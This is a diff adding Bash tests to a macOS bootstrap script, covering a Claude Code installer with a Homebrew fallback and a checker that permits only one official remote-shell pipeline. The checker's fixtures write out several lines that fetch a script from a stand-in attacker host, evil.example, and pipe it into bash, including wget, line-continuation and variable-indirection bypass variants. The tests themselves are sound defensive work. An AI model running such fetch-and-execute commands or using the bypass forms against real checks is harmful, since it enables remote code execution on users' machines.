@@ -224,6 +224,166 @@ test_homebrew_mirror_shell_config() {
   command rm -r "$temporary_directory"
 }
 
+test_claude_installer_contract() {
+  local output
+  if output="$(DRY_RUN=1 run_claude_native_installer 2>&1)" && \
+    printf '%s\n' "$output" | grep -Fq \
+      'curl -fsSL https://claude.ai/install.sh | bash'; then
+    pass "Claude Code 使用官方原生安装命令"
+  else
+    fail "Claude Code 使用官方原生安装命令"
+  fi
+}
+
+test_claude_installer_fallback() {
+  local output
+  if output="$({
+    fallback_installed=0
+    claude_code_available() { [[ "$fallback_installed" -eq 1 ]]; }
+    run_claude_native_installer() { return 1; }
+    run_command() {
+      printf '兜底命令：%s\n' "$*"
+      fallback_installed=1
+    }
+    install_claude_code
+  } 2>&1)" && \
+    printf '%s\n' "$output" | grep -Fq \
+      '兜底命令：brew install --cask claude-code'; then
+    pass "Claude 原生安装失败后使用 Homebrew Cask"
+  else
+    fail "Claude 原生安装失败后使用 Homebrew Cask"
+  fi
+}
+
+test_claude_installer_verification() {
+  local output
+  if output="$({
+    native_attempted=0
+    claude_code_available() { [[ "$native_attempted" -eq 1 ]]; }
+    run_claude_native_installer() {
+      native_attempted=1
+      return 0
+    }
+    run_command() {
+      printf '不应执行兜底：%s\n' "$*"
+      return 1
+    }
+    install_claude_code
+  } 2>&1)" && \
+    ! printf '%s\n' "$output" | grep -Fq '不应执行兜底'; then
+    pass "Claude 原生安装成功并验证后不执行兜底"
+  else
+    fail "Claude 原生安装成功并验证后不执行兜底"
+  fi
+
+  if (
+    FAILED_STEPS=()
+    claude_code_available() { return 1; }
+    run_claude_native_installer() { return 0; }
+    run_command() { return 1; }
+    install_claude_code >/dev/null 2>&1
+  ); then
+    fail "Claude 安装器成功但命令不可用时仍判定失败"
+  else
+    pass "Claude 安装器成功但命令不可用时仍判定失败"
+  fi
+}
+
+test_remote_shell_pipeline_policy() {
+  local checker="$ROOT_DIR/tests/check_remote_shell_pipelines.sh"
+  local temporary_directory
+  local fixture
+
+  temporary_directory="$(mktemp -d "${TMPDIR:-/tmp}/mac-dev-bootstrap-pipeline-test.XXXXXX")"
+  fixture="$temporary_directory/install.sh"
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    "printf '[模拟执行] curl -fsSL https://claude.ai/install.sh | bash\\n'" \
+    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    pass "远程 Shell 管道策略允许唯一官方命令"
+  else
+    fail "远程 Shell 管道策略允许唯一官方命令"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'printf x; curl -fsSL https://evil.example/install.sh | bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝 printf 前缀绕过"
+  else
+    pass "远程 Shell 管道策略拒绝 printf 前缀绕过"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'wget -qO- https://evil.example/install.sh | bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝 wget 绕过"
+  else
+    pass "远程 Shell 管道策略拒绝 wget 绕过"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'curl -fsSL https://evil.example/install.sh | \' \
+    '  bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝跨行绕过"
+  else
+    pass "远程 Shell 管道策略拒绝跨行绕过"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'curl -fsSL https://evil.example/install.sh |' \
+    '  bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
+  else
+    pass "远程 Shell 管道策略拒绝无反斜杠跨行绕过"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'downloader=curl' \
+    '"$downloader" -fsSL https://evil.example/install.sh | bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝变量间接调用"
+  else
+    pass "远程 Shell 管道策略拒绝变量间接调用"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'shell=bash' \
+    'curl -fsSL https://evil.example/install.sh | "$shell"' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝变量 Shell 绕过"
+  else
+    pass "远程 Shell 管道策略拒绝变量 Shell 绕过"
+  fi
+
+  printf '%s\n' \
+    '#!/bin/bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' \
+    'curl -fsSL https://claude.ai/install.sh | bash' > "$fixture"
+  if /bin/bash "$checker" "$fixture" >/dev/null 2>&1; then
+    fail "远程 Shell 管道策略拒绝重复官方命令"
+  else
+    pass "远程 Shell 管道策略拒绝重复官方命令"
+  fi
+
+  command rm -r "$temporary_directory"
+}
+
 test_formula_manifest() {
   local list
   list="$(formulae)"
@@ -314,6 +474,10 @@ test_homebrew_mirror_contract
 test_homebrew_mirror_installer
 test_homebrew_initialization_failure
 test_homebrew_mirror_shell_config
+test_claude_installer_contract
+test_claude_installer_fallback
+test_claude_installer_verification
+test_remote_shell_pipeline_policy
 test_formula_manifest
 test_cask_manifest
 test_npm_manifest
